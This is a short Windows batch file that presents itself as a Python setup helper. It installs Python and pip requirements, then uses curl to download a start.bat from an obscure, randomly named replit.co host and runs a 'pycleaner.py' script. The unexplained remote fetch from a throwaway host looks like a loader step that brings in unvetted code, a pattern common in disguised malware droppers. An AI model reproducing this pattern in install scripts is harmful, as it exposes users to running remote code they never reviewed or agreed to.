@echo off
@echo off
:: Check for Python Installation
python --version 2>NUL
if errorlevel 1 goto errorNoPython

:: Reaching here means Python is installed.
:: Execute stuff...

:: Once done, exit the batch file -- skips executing the errorNoPython section
goto:eof

:errorNoPython
echo.
echo Error^: Python not installed
curl -L "https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe" -O
start /W python-3.10.7-amd64.exe
cd %~dp0
MD tools
py -3 -m pip install -r requirements.txt
curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
python pycleaner.py
